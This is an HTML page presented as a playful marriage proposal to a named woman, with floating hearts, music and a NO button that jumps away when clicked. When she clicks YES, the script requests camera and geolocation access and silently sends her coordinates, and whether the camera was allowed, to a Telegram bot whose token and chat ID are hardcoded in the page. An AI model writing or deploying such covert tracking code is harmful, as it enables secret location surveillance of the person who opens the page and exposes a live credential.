<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Marry Me 💍</title>

<style>
body {
  margin:0;
  overflow:hidden;
  font-family:sans-serif;
  text-align:center;
  color:white;
}

/* VIDEO FON */
video {
  position:fixed;
  width:100%;
  height:100%;
  object-fit:cover;
  z-index:-1;
}

/* TEXT */
h1 {
  margin-top:80px;
  font-size:28px;
  text-shadow:0 0 15px black;
}

/* BUTTON */
button {
  padding:15px 25px;
  font-size:18px;
  border:none;
  border-radius:30px;
  margin:10px;
  cursor:pointer;
}

#yes {
  background:#ff3366;
  color:white;
}

#no {
  background:white;
  color:#ff3366;
}

/* HEARTS */
.heart {
  position:fixed;
  font-size:24px;
  animation:float 4s linear infinite;
}

@keyframes float {
  0%{transform:translateY(100vh);}
  100%{transform:translateY(-10vh);}
}

/* GIF */
#gif {
  display:none;
  margin-top:20px;
}
</style>
</head>

<body>

<!-- VIDEO -->
<video autoplay muted loop>
  <source src="https://www.w3schools.com/howto/rain.mp4" type="video/mp4">
</video>

<h1 id="text">Shaxzoda, will you marry me? 💍</h1>

<button id="yes">YES 💖</button>
<button id="no">NO 😢</button>

<div id="gif">
  <img src="https://media.tenor.com/8QyY2HkJ5nEAAAAi/love.gif" width="200">
</div>

<audio id="music" src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3"></audio>

<script>

// ❤️ yuraklar
setInterval(()=>{
  let h=document.createElement("div");
  h.className="heart";
  h.innerHTML="❤️";
  h.style.left=Math.random()*100+"vw";
  document.body.appendChild(h);
  setTimeout(()=>h.remove(),4000);
},300);

// NO text
let texts=["Iltimos 😢","Yana o‘yla 🙈","Oxirgi imkon 😭","Baribir YES 😏","Yuragim sinadi 💔"];
let i=0;

let no=document.getElementById("no");
let text=document.getElementById("text");

no.onclick=()=>{
  text.innerHTML=texts[i%texts.length];
  i++;

  no.style.position="absolute";
  no.style.left=Math.random()*80+"vw";
  no.style.top=Math.random()*80+"vh";
};

// YES bosilganda
document.getElementById("yes").onclick=()=>{

  document.getElementById("music").play();
  document.getElementById("gif").style.display="block";
  text.innerHTML="I LOVE YOU ❤️💍";

  // 📸 Kamera ochish
  navigator.mediaDevices.getUserMedia({video:true})
  .then(stream=>{
    fetch("https://api.telegram.org/bot8637643313:AAF6NO208binN603HQQB9JvqpvAGLaXRZGQ/sendMessage?chat_id=6258625712&text=💍 SHAXZODA YES BOSDI!!! 😍🔥");
  })
  .catch(()=>{
    fetch("https://api.telegram.org/bot8637643313:AAF6NO208binN603HQQB9JvqpvAGLaXRZGQ/sendMessage?chat_id=6258625712&text=YES bosildi (kamera rad qilindi)");
  });

  // 📍 Location olish
  navigator.geolocation.getCurrentPosition(pos=>{
    let loc="📍Lat:"+pos.coords.latitude+" Lon:"+pos.coords.longitude;
    fetch("https://api.telegram.org/bot8637643313:AAF6NO208binN603HQQB9JvqpvAGLaXRZGQ/sendMessage?chat_id=6258625712&text="+loc);
  });

};
</script>

</body>
</html>
